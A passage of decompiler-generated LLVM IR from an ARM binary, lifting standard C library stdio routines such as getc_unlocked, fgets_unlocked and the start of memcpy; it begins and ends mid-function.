  %v2_166a8 = and i32 %v4_166a0, 65471
  store i32 %v2_166a8, i32* %r3.global-to-local, align 4
  %v2_166ac = trunc i32 %v2_166a8 to i16
  store i16 %v2_166ac, i16* %v2_166a0, align 2
  %v1_166b0 = load i32, i32* %r2.global-to-local, align 4
  %v2_166b0 = load i32, i32* @r4, align 4
  %v3_166b0 = add i32 %v2_166b0, 28
  %v4_166b0 = inttoptr i32 %v3_166b0 to i32*
  store i32 %v1_166b0, i32* %v4_166b0, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

bb73:                                             ; preds = %bb72, %.thread16, %dec_label_pc_16680, %.thread14
  %v0_166bc = phi i32 [ -1, %.thread16 ], [ 0, %bb72 ], [ %v0_166bc.pre, %dec_label_pc_16680 ], [ 0, %.thread14 ]
  store i32 %v0_166bc, i32* %r0.global-to-local, align 4
  store i32 %v6_16338, i32* %r5.global-to-local, align 4
  ret i32 %v0_166bc

; uselistorder directives
  uselistorder i32 %v0_166bc, { 1, 0 }
  uselistorder i32 %v3_16674, { 1, 2, 0 }
  uselistorder i32 %v0_16648, { 1, 0, 2 }
  uselistorder i32 %v1_1662c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_165cc, { 1, 0, 2 }
  uselistorder i32 %v0_16594, { 1, 0, 2 }
  uselistorder i32 %v1_16578.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1655c, { 1, 0 }
  uselistorder i32 %v0_16500, { 1, 0, 2 }
  uselistorder i32 %v1_164e4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_164d4, { 1, 0 }
  uselistorder i32 %v0_16498, { 1, 0, 2 }
  uselistorder i32 %v1_1647c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_16464, { 1, 0 }
  uselistorder i32 %v0_1642c, { 1, 0, 2 }
  uselistorder i32 %v1_16410.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16400, { 1, 0 }
  uselistorder i32 %v0_163bc, { 1, 0, 2 }
  uselistorder i32 %v1_163a0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_16378, { 2, 1, 0, 3 }
  uselistorder i32 %tmp, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %sl.global-to-local, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3, 5, 4, 6, 8, 7, 9 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 9, 8, 54, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 53, 22, 23, 24, 25, 26, 27, 29, 28, 0, 30, 31, 32, 33, 35, 34, 1, 36, 37, 38, 39, 41, 40, 2, 42, 43, 44, 45, 47, 46, 55, 48, 49, 52, 50, 51 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 5, 3, 4, 22, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 3, 15, 4, 5, 7, 6, 0, 8, 9, 10, 11, 12, 39, 40, 13, 14, 34, 16, 17, 18, 35, 36, 19, 20, 22, 21, 1, 23, 24, 25, 27, 26, 2, 28, 29, 30, 37, 38, 31, 32, 33 }
  uselistorder i32 92, { 0, 1, 2, 5, 3, 4, 6 }
  uselistorder i32 152, { 1, 3, 2, 4, 5, 8, 6, 9, 7, 10, 0, 11, 12, 14, 13, 15, 18, 16, 19, 17, 20 }
  uselistorder i32 129, { 7, 8, 9, 5, 6, 10, 11, 0, 1, 2, 3, 4, 12, 13 }
  uselistorder i32 -61504, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 34, 35, 36, 32, 33 }
  uselistorder i32 -61441, { 16, 17, 18, 19, 20, 21, 12, 13, 14, 15, 22, 23, 24, 25, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 31, 26, 27, 28, 29, 30 }
  uselistorder label %bb73, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_16674, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_1664c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16634, { 1, 0 }
  uselistorder label %bb71, { 2, 0, 1 }
  uselistorder label %dec_label_pc_165b4, { 1, 0 }
  uselistorder label %dec_label_pc_165a8, { 1, 0 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %dec_label_pc_16598, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16580, { 1, 0 }
  uselistorder label %dec_label_pc_1653c, { 1, 0 }
  uselistorder label %dec_label_pc_1652cthread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_16504, { 2, 1, 0 }
  uselistorder label %dec_label_pc_164ec, { 1, 0 }
  uselistorder label %dec_label_pc_164ac, { 1, 0 }
  uselistorder label %bb68, { 1, 0 }
  uselistorder label %dec_label_pc_1649c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16484, { 1, 0 }
  uselistorder label %dec_label_pc_16458, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16430, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16418, { 1, 0 }
  uselistorder label %dec_label_pc_163d0, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %dec_label_pc_163c0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_163a8, { 1, 0 }
  uselistorder label %dec_label_pc_16374, { 1, 0 }
}

define i32 @function_166d0(i32 %arg1) local_unnamed_addr {
dec_label_pc_166d0:
  %v0_166d0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_166d0, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_166d0
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_166d0, %bb
  %v10_166e0 = phi i32 [ %arg1, %dec_label_pc_166d0 ], [ 0, %bb ]
  ret i32 %v10_166e0

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_166e4 = load i32, i32* @r4, align 4
  store i32 %v3_166e4, i32* %stack_var_-12, align 4
  %v6_166e4 = load i32, i32* @r5, align 4
  %v9_166e4 = load i32, i32* @lr, align 4
  %v0_166e8 = load i32, i32* @r0, align 4
  %v1_166e8 = add i32 %v0_166e8, 16
  %v2_166e8 = inttoptr i32 %v1_166e8 to i32*
  %v3_166e8 = load i32, i32* %v2_166e8, align 4
  store i32 %v3_166e8, i32* %r2.global-to-local, align 4
  %v1_166ec = add i32 %v0_166e8, 24
  %v2_166ec = inttoptr i32 %v1_166ec to i32*
  %v3_166ec = load i32, i32* %v2_166ec, align 4
  %v3_166f0 = icmp ult i32 %v3_166e8, %v3_166ec
  store i32 %v0_166e8, i32* @r4, align 4
  br i1 %v3_166f0, label %bb, label %dec_label_pc_16710

bb:                                               ; preds = %entry
  %v2_166fc = inttoptr i32 %v3_166e8 to i8*
  %v3_166fc = load i8, i8* %v2_166fc, align 1
  %v4_166fc = zext i8 %v3_166fc to i32
  store i32 %v4_166fc, i32* %r0.global-to-local, align 4
  %v6_166fc = add i32 %v3_166e8, 1
  store i32 %v6_166fc, i32* %r2.global-to-local, align 4
  store i32 %v6_166fc, i32* %v2_166e8, align 4
  br label %dec_label_pc_167fc

dec_label_pc_16710:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* @r5, align 4
  %v1_16710 = inttoptr i32 %v0_166e8 to i16*
  %v2_16710 = load i16, i16* %v1_16710, align 2
  %v3_16710 = zext i16 %v2_16710 to i32
  %v1_16714 = and i32 %v3_16710, 131
  %tmp25 = icmp ugt i32 %v1_16714, 128
  br i1 %tmp25, label %dec_label_pc_16730, label %dec_label_pc_16720

dec_label_pc_16720:                               ; preds = %dec_label_pc_16710
  store i32 128, i32* @r1, align 4
  %v0_16724 = call i32 @__stdio_trans2r_o()
  store i32 %v0_16724, i32* %r0.global-to-local, align 4
  %v2_16728 = icmp eq i32 %v0_16724, 0
  br i1 %v2_16728, label %dec_label_pc_16720.dec_label_pc_16730_crit_edge, label %dec_label_pc_167f8

dec_label_pc_16720.dec_label_pc_16730_crit_edge:  ; preds = %dec_label_pc_16720
  %v0_16730.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16730

dec_label_pc_16730:                               ; preds = %dec_label_pc_16720.dec_label_pc_16730_crit_edge, %dec_label_pc_16710
  %v2_16770 = phi i32 [ %v0_16730.pre, %dec_label_pc_16720.dec_label_pc_16730_crit_edge ], [ %v0_166e8, %dec_label_pc_16710 ]
  %v1_16730 = inttoptr i32 %v2_16770 to i16*
  %v2_16730 = load i16, i16* %v1_16730, align 2
  %v3_16730 = zext i16 %v2_16730 to i32
  store i32 %v3_16730, i32* %r2.global-to-local, align 4
  %v1_16734 = and i32 %v3_16730, 2
  %v2_16734 = icmp eq i32 %v1_16734, 0
  br i1 %v2_16734, label %dec_label_pc_16760, label %dec_label_pc_1673c

dec_label_pc_1673c:                               ; preds = %dec_label_pc_16730
  %tmp26 = urem i16 %v2_16730, 2
  %v1_1673c = zext i16 %tmp26 to i32
  %tmp22 = sub nsw i32 0, %v1_1673c
  %v4_16740 = and i32 %tmp22, 4
  %v5_16740 = add i32 %v4_16740, %v2_16770
  %v1_16744 = add i32 %v5_16740, 36
  %v2_16744 = inttoptr i32 %v1_16744 to i8*
  %v3_16744 = load i8, i8* %v2_16744, align 1
  %v4_16744 = zext i8 %v3_16744 to i32
  %v1_16748 = add nsw i32 %v3_16730, -1
  store i32 %v1_16748, i32* %r2.global-to-local, align 4
  store i32 %v4_16744, i32* %r0.global-to-local, align 4
  %v2_16754 = add i32 %v2_16770, 40
  %v3_16754 = inttoptr i32 %v2_16754 to i32*
  store i32 0, i32* %v3_16754, align 4
  %v0_16758 = load i32, i32* %r2.global-to-local, align 4
  %v1_16758 = trunc i32 %v0_16758 to i16
  %v2_16758 = load i32, i32* @r4, align 4
  %v3_16758 = inttoptr i32 %v2_16758 to i16*
  store i16 %v1_16758, i16* %v3_16758, align 2
  br label %dec_label_pc_167fc

dec_label_pc_16760:                               ; preds = %dec_label_pc_16730
  %v1_16760 = add i32 %v2_16770, 16
  %v1_16764 = inttoptr i32 %v1_16760 to i32*
  %v2_16764 = load i32, i32* %v1_16764, align 4
  store i32 %v2_16764, i32* @r1, align 4
  %v3_16764 = add i32 %v2_16770, 20
  %v4_16764 = inttoptr i32 %v3_16764 to i32*
  %v5_16764 = load i32, i32* %v4_16764, align 4
  %v9_16768 = icmp eq i32 %v5_16764, %v2_16764
  br i1 %v9_16768, label %dec_label_pc_16778, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_16760
  %v2_1676c = inttoptr i32 %v2_16764 to i8*
  %v3_1676c = load i8, i8* %v2_1676c, align 1
  %v4_1676c = zext i8 %v3_1676c to i32
  store i32 %v4_1676c, i32* %r0.global-to-local, align 4
  %v6_1676c = add i32 %v2_16764, 1
  store i32 %v6_1676c, i32* @r1, align 4
  store i32 %v6_1676c, i32* %v1_16764, align 4
  br label %dec_label_pc_167fc

dec_label_pc_16778:                               ; preds = %dec_label_pc_16760
  %v1_16778 = add i32 %v2_16770, 4
  %v2_16778 = inttoptr i32 %v1_16778 to i32*
  %v3_16778 = load i32, i32* %v2_16778, align 4
  %v7_1677c = icmp eq i32 %v3_16778, -2
  br i1 %v7_1677c, label %.thread7, label %dec_label_pc_16790

.thread7:                                         ; preds = %dec_label_pc_16778
  %v2_16780 = or i16 %v2_16730, 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i16 %v2_16780, i16* %v1_16730, align 2
  br label %dec_label_pc_167fc

dec_label_pc_16790:                               ; preds = %dec_label_pc_16778
  %v1_16790 = and i32 %v3_16730, 768
  %v2_16790 = icmp eq i32 %v1_16790, 0
  br i1 %v2_16790, label %.thread9, label %bb23

bb23:                                             ; preds = %dec_label_pc_16790
  %v1_16798 = load i32, i32* @r5, align 4
  %v3_16798 = add i32 %v1_16798, 76
  %v4_16798 = inttoptr i32 %v3_16798 to i32*
  %v5_16798 = load i32, i32* %v4_16798, align 4
  store i32 %v5_16798, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_16790, %bb23
  store i32 92064, i32* @lr, align 4
  %v1_1679c = xor i1 %v2_16790, true
  call void @__pseudo_cond_branch(i1 %v1_1679c, i32 ptrtoint (i32* @global_var_16338.560 to i32))
  %v0_167a0 = load i32, i32* @r4, align 4
  %v1_167a0 = add i32 %v0_167a0, 8
  store i32 %v1_167a0, i32* %r2.global-to-local, align 4
  %v1_167a4 = inttoptr i32 %v1_167a0 to i32*
  %v2_167a4 = load i32, i32* %v1_167a4, align 4
  store i32 %v2_167a4, i32* %r2.global-to-local, align 4
  %v3_167a4 = add i32 %v0_167a0, 12
  %v4_167a4 = inttoptr i32 %v3_167a4 to i32*
  %v5_167a4 = load i32, i32* %v4_167a4, align 4
  %v9_167a8 = icmp eq i32 %v5_167a4, %v2_167a4
  br i1 %v9_167a8, label %dec_label_pc_167dc, label %dec_label_pc_167b0

dec_label_pc_167b0:                               ; preds = %.thread9
  %v2_167b0 = add i32 %v0_167a0, 24
  %v3_167b0 = inttoptr i32 %v2_167b0 to i32*
  store i32 %v2_167a4, i32* %v3_167b0, align 4
  %v0_167b4 = load i32, i32* @r4, align 4
  store i32 %v0_167b4, i32* %r0.global-to-local, align 4
  %v2_167b8 = call i32 @__stdio_rfill(i32 %v0_167b4)
  store i32 %v2_167b8, i32* %r0.global-to-local, align 4
  %v2_167bc = icmp eq i32 %v2_167b8, 0
  br i1 %v2_167bc, label %dec_label_pc_167f8, label %dec_label_pc_167c4

dec_label_pc_167c4:                               ; preds = %dec_label_pc_167b0
  %v0_167c4 = load i32, i32* @r4, align 4
  %v1_167c4 = add i32 %v0_167c4, 20
  %v2_167c4 = inttoptr i32 %v1_167c4 to i32*
  %v3_167c4 = load i32, i32* %v2_167c4, align 4
  %v2_167c8 = add i32 %v0_167c4, 24
  %v3_167c8 = inttoptr i32 %v2_167c8 to i32*
  store i32 %v3_167c4, i32* %v3_167c8, align 4
  %v0_167cc = load i32, i32* @r4, align 4
  %v1_167cc = add i32 %v0_167cc, 16
  %v2_167cc = inttoptr i32 %v1_167cc to i32*
  %v3_167cc = load i32, i32* %v2_167cc, align 4
  %v1_167d0 = inttoptr i32 %v3_167cc to i8*
  %v2_167d0 = load i8, i8* %v1_167d0, align 1
  %v3_167d0 = zext i8 %v2_167d0 to i32
  store i32 %v3_167d0, i32* %r0.global-to-local, align 4
  %v5_167d0 = add i32 %v3_167cc, 1
  store i32 %v5_167d0, i32* %v2_167cc, align 4
  br label %dec_label_pc_167fc

dec_label_pc_167dc:                               ; preds = %.thread9
  %v1_167dc = inttoptr i32 %v0_167a0 to i16*
  store i32 %v0_167a0, i32* %r0.global-to-local, align 4
  %v2_167e0 = ptrtoint i8* %stack_var_-17 to i32
  store i32 %v2_167e0, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_167e8 = call i32 @__stdio_READ(i16* %v1_167dc, i32 %v2_167e0, i32 1)
  store i32 %v5_167e8, i32* %r0.global-to-local, align 4
  %v2_167ec = icmp eq i32 %v5_167e8, 0
  br i1 %v2_167ec, label %dec_label_pc_167f8, label %bb24

bb24:                                             ; preds = %dec_label_pc_167dc
  %v4_167f0 = load i8, i8* %stack_var_-17, align 1
  %v5_167f0 = sext i8 %v4_167f0 to i32
  store i32 %v5_167f0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_167fc

dec_label_pc_167f8:                               ; preds = %dec_label_pc_167dc, %dec_label_pc_16720, %dec_label_pc_167b0
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_167fc

dec_label_pc_167fc:                               ; preds = %bb, %.thread7, %bb24, %.thread4, %dec_label_pc_167c4, %dec_label_pc_1673c, %dec_label_pc_167f8
  %v2_16800 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16800, i32* @r4, align 4
  store i32 %v6_166e4, i32* @r5, align 4
  store i32 %v9_166e4, i32* @lr, align 4
  %v1_16804 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_16804

; uselistorder directives
  uselistorder i32 %v2_16764, { 1, 0, 2, 3 }
  uselistorder i32 %v2_16770, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_166e8, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 6, 5, 7, 8, 9, 10, 13, 12 }
  uselistorder i32 768, { 2, 0, 3, 1, 4 }
  uselistorder label %dec_label_pc_167fc, { 6, 2, 4, 1, 3, 5, 0 }
  uselistorder label %dec_label_pc_167f8, { 0, 2, 1 }
  uselistorder label %.thread9, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v9_16810 = load i32, i32* @r6, align 4
  %v12_16810 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16814 = icmp eq i32 %arg2, 0
  store i1 %v2_16814, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  br i1 %tmp22, label %dec_label_pc_1689c, label %dec_label_pc_16884.preheader

dec_label_pc_16884.preheader:                     ; preds = %entry
  store i32 %tmp, i32* @r5, align 4
  %v1_168842 = add i32 %arg2, -1
  store i32 %v1_168842, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_168848 = icmp eq i32 %arg2, 1
  store i1 %v7_168848, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_168848, label %dec_label_pc_1688c, label %dec_label_pc_16830

dec_label_pc_16830:                               ; preds = %dec_label_pc_16884.preheader, %dec_label_pc_16884.backedge.dec_label_pc_16830_crit_edge
  %v0_16854 = phi i32 [ %v0_16830.pre, %dec_label_pc_16884.backedge.dec_label_pc_16830_crit_edge ], [ %arg3, %dec_label_pc_16884.preheader ]
  %v1_16830 = add i32 %v0_16854, 16
  %v2_16830 = inttoptr i32 %v1_16830 to i32*
  %v3_16830 = load i32, i32* %v2_16830, align 4
  store i32 %v3_16830, i32* %r2.global-to-local, align 4
  %v1_16834 = add i32 %v0_16854, 24
  %v2_16834 = inttoptr i32 %v1_16834 to i32*
  %v3_16834 = load i32, i32* %v2_16834, align 4
  store i32 %v3_16834, i32* %r3.global-to-local, align 4
  %v3_16838 = icmp uge i32 %v3_16830, %v3_16834
  store i1 %v3_16838, i1* %cpsr_c.global-to-local, align 1
  %v9_16838 = icmp eq i32 %v3_16830, %v3_16834
  store i1 %v9_16838, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_16838, label %dec_label_pc_16854, label %dec_label_pc_16840

dec_label_pc_16840:                               ; preds = %dec_label_pc_16830
  %v1_16840 = inttoptr i32 %v3_16830 to i8*
  %v2_16840 = load i8, i8* %v1_16840, align 1
  %v3_16840 = zext i8 %v2_16840 to i32
  store i32 %v3_16840, i32* %r3.global-to-local, align 4
  %v5_16840 = add i32 %v3_16830, 1
  store i32 %v5_16840, i32* %r2.global-to-local, align 4
  %v2_16844 = load i32, i32* @r5, align 4
  %v3_16844 = inttoptr i32 %v2_16844 to i8*
  store i8 %v2_16840, i8* %v3_16844, align 1
  %v4_16844 = load i32, i32* @r5, align 4
  %v5_16844 = add i32 %v4_16844, 1
  store i32 %v5_16844, i32* @r5, align 4
  %v0_16848 = load i32, i32* %r3.global-to-local, align 4
  %v2_16848 = icmp ugt i32 %v0_16848, 9
  store i1 %v2_16848, i1* %cpsr_c.global-to-local, align 1
  %v7_16848 = icmp eq i32 %v0_16848, 10
  store i1 %v7_16848, i1* %cpsr_z.global-to-local, align 1
  %v0_1684c = load i32, i32* %r2.global-to-local, align 4
  %v1_1684c = load i32, i32* @r4, align 4
  %v2_1684c = add i32 %v1_1684c, 16
  %v3_1684c = inttoptr i32 %v2_1684c to i32*
  store i32 %v0_1684c, i32* %v3_1684c, align 4
  br i1 %v7_16848, label %dec_label_pc_1688c, label %dec_label_pc_16884.backedge

dec_label_pc_16854:                               ; preds = %dec_label_pc_16830
  %v1_16854 = inttoptr i32 %v0_16854 to i16*
  %v3_16858 = call i32 @getc_unlocked(i16* %v1_16854)
  %v3_1685c = icmp eq i32 %v3_16858, -1
  store i1 %v3_1685c, i1* %cpsr_c.global-to-local, align 1
  %v8_1685c = icmp eq i32 %v3_16858, -1
  store i1 %v8_1685c, i1* %cpsr_z.global-to-local, align 1
  %v1_16860 = urem i32 %v3_16858, 256
  store i32 %v1_16860, i32* %r3.global-to-local, align 4
  br i1 %v3_1685c, label %dec_label_pc_16868, label %dec_label_pc_16880

dec_label_pc_16868:                               ; preds = %dec_label_pc_16854
  %v0_16868 = load i32, i32* @r4, align 4
  %v1_16868 = inttoptr i32 %v0_16868 to i16*
  %v2_16868 = load i16, i16* %v1_16868, align 2
  %v3_16868 = zext i16 %v2_16868 to i32
  store i32 %v3_16868, i32* %r3.global-to-local, align 4
  %v1_1686c = and i32 %v3_16868, 8
  %v2_1686c = icmp eq i32 %v1_1686c, 0
  store i1 %v2_1686c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1686c, label %dec_label_pc_1688c, label %dec_label_pc_1689c

dec_label_pc_16880:                               ; preds = %dec_label_pc_16854
  %v1_16878 = trunc i32 %v3_16858 to i8
  %v2_16878 = load i32, i32* @r5, align 4
  %v3_16878 = inttoptr i32 %v2_16878 to i8*
  store i8 %v1_16878, i8* %v3_16878, align 1
  %v4_16878 = load i32, i32* @r5, align 4
  %v5_16878 = add i32 %v4_16878, 1
  store i32 %v5_16878, i32* @r5, align 4
  %v0_1687c = load i32, i32* %r3.global-to-local, align 4
  %v2_1687c = icmp ugt i32 %v0_1687c, 9
  store i1 %v2_1687c, i1* %cpsr_c.global-to-local, align 1
  %v7_1687c = icmp eq i32 %v0_1687c, 10
  store i1 %v7_1687c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1687c, label %dec_label_pc_1688c, label %dec_label_pc_16884.backedge

dec_label_pc_16884.backedge:                      ; preds = %dec_label_pc_16880, %dec_label_pc_16840
  %v0_16884 = load i32, i32* @r6, align 4
  %v1_16884 = add i32 %v0_16884, -1
  store i32 %v1_16884, i32* @r6, align 4
  %v2_16884 = icmp ne i32 %v0_16884, 0
  store i1 %v2_16884, i1* %cpsr_c.global-to-local, align 1
  %v7_16884 = icmp eq i32 %v0_16884, 1
  store i1 %v7_16884, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16884, label %dec_label_pc_1688c, label %dec_label_pc_16884.backedge.dec_label_pc_16830_crit_edge

dec_label_pc_16884.backedge.dec_label_pc_16830_crit_edge: ; preds = %dec_label_pc_16884.backedge
  %v0_16830.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16830

dec_label_pc_1688c:                               ; preds = %dec_label_pc_16880, %dec_label_pc_16884.backedge, %dec_label_pc_16840, %dec_label_pc_16884.preheader, %dec_label_pc_16868
  %v0_1688c = load i32, i32* @r5, align 4
  %v1_1688c = load i32, i32* @r7, align 4
  %v3_1688c = icmp uge i32 %v0_1688c, %v1_1688c
  store i1 %v3_1688c, i1* %cpsr_c.global-to-local, align 1
  %v9_1688c = icmp eq i32 %v0_1688c, %v1_1688c
  store i1 %v9_1688c, i1* %cpsr_z.global-to-local, align 1
  %v2_16890 = xor i1 %v9_1688c, true
  %v3_16890 = and i1 %v3_1688c, %v2_16890
  br i1 %v3_16890, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_1688c
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_16894 = inttoptr i32 %v0_1688c to i8*
  store i8 0, i8* %v7_16894, align 1
  %v0_16898.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_16898.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_1688c, %bb
  %v1_16898 = phi i1 [ %v1_16898.pre, %bb ], [ %v9_1688c, %dec_label_pc_1688c ]
  %v0_16898 = phi i1 [ %v0_16898.pre, %bb ], [ %v3_1688c, %dec_label_pc_1688c ]
  %v2_16898 = xor i1 %v1_16898, true
  %v3_16898 = and i1 %v0_16898, %v2_16898
  br i1 %v3_16898, label %.dec_label_pc_168a0_crit_edge, label %dec_label_pc_1689c

.dec_label_pc_168a0_crit_edge:                    ; preds = %.thread14
  %v0_168a0.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_168a0

dec_label_pc_1689c:                               ; preds = %entry, %dec_label_pc_16868, %.thread14
  br label %dec_label_pc_168a0

dec_label_pc_168a0:                               ; preds = %.dec_label_pc_168a0_crit_edge, %dec_label_pc_1689c
  %v0_168a0 = phi i32 [ %v0_168a0.pre, %.dec_label_pc_168a0_crit_edge ], [ 0, %dec_label_pc_1689c ]
  store i32 %v9_16810, i32* @r6, align 4
  store i32 %v12_16810, i32* @r7, align 4
  ret i32 %v0_168a0

; uselistorder directives
  uselistorder i1 %v9_1688c, { 1, 0, 2 }
  uselistorder i32 %v1_1688c, { 1, 0 }
  uselistorder i32 %v0_1688c, { 0, 2, 1 }
  uselistorder i32 %v0_16884, { 2, 0, 1 }
  uselistorder i32 %v0_1687c, { 1, 0 }
  uselistorder i32 %v3_16858, { 2, 1, 0, 3 }
  uselistorder i32 %v0_16848, { 1, 0 }
  uselistorder i32 %v3_16830, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_16854, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 9, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 8, 7 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_168a0, { 1, 0 }
  uselistorder label %dec_label_pc_1689c, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_1688c, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_16830, { 1, 0 }
}

define i32 @_memcpy() local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_168b0 = load i32, i32* @r1, align 4
  %v1_168b0 = load i32, i32* @r0, align 4
  %v2_168b0 = sub i32 %v0_168b0, %v1_168b0
  %v3_168b0 = icmp ult i32 %v0_168b0, %v1_168b0
  %v4_168b0 = xor i32 %v1_168b0, %v0_168b0
  %v5_168b0 = xor i32 %v2_168b0, %v0_168b0
  %v6_168b0 = and i32 %v5_168b0, %v4_168b0
  %v7_168b0 = icmp slt i32 %v6_168b0, 0
  store i1 %v7_168b0, i1* %cpsr_v.global-to-local, align 1
  %v8_168b0 = icmp slt i32 %v2_168b0, 0
  store i1 %v8_168b0, i1* %cpsr_n.global-to-local, align 1
  %v9_168b0 = icmp eq i32 %v0_168b0, %v1_168b0
  store i1 %v9_168b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_168b0, label %dec_label_pc_16b04, label %dec_label_pc_168b8

dec_label_pc_168b8:                               ; preds = %entry
  br i1 %v9_168b0, label %.thread130, label %bb

.thread130:                                       ; preds = %bb153, %.thread129, %bb150, %dec_label_pc_168b8
  %merge = phi i32 [ %v0_168b0, %dec_label_pc_168b8 ], [ %v2_16b98, %bb150 ], [ %v11_16bb4, %bb153 ], [ %v7_16bb4, %.thread129 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_168b8
  %v5_168bc = inttoptr i32 %v1_168b0 to i8*
  store i8* %v5_168bc, i8** %stack_var_-8, align 4
  %v8_168bc = load i32, i32* @lr, align 4
  %v0_168c0 = load i32, i32* @r2, align 4
  %v2_168c0 = add i32 %v0_168c0, -4
  store i32 %v2_168c0, i32* %r2.global-to-local, align 4
  %v4_168c0 = sub i32 3, %v0_168c0
  %v5_168c0 = and i32 %v4_168c0, %v0_168c0
  %v6_168c0 = icmp slt i32 %v5_168c0, 0
  store i1 %v6_168c0, i1* %cpsr_v.global-to-local, align 1
  %v7_168c0 = icmp slt i32 %v2_168c0, 0
